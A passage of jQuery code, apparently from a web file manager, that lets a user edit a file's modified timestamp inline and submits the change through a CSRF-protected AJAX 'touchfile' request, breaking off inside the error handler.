                    var file = $td.attr('data-file');
                    var $input = $('<input type="datetime-local" class="fm-date-edit">').val(fmFormatLocalDT(ts));
                    $td.addClass('is-editing').empty().append($input);
                    $input.trigger('focus');
                    var done = false;
                    var revert = function(){
                        if (done) return; done = true;
                        $td.removeClass('is-editing').text(origText).attr('data-order', origOrder);
                    };
                    var submit = function(){
                        if (done) return;
                        var v = $input.val();
                        if (!v) { revert(); return; }
                        var newTs = Math.floor(new Date(v).getTime()/1000);
                        if (!newTs || isNaN(newTs)) { revert(); return; }
                        done = true;
                        $.ajax({
                            type: 'POST',
                            url: '',
                            data: { ajax: true, type: 'touchfile', file: file, ts: newTs, token: window.csrf },
                            dataType: 'json',
                            success: function(resp){
                                if (resp && resp.ok) {
                                    $td.removeClass('is-editing').empty().text(resp.modified);
                                    $td.attr('data-ts', newTs);
                                    if (resp.sort) $td.attr('data-order', resp.sort);
                                    toast('Modified date updated');
                                } else {
                                    $td.removeClass('is-editing').text(origText).attr('data-order', origOrder);
                                    toast((resp && resp.error) ? resp.error : 'Update failed');
                                }
                            },
                            error: function(){
                                $td.removeClass('is-editing').text(origText).attr('data-order', origOrder);
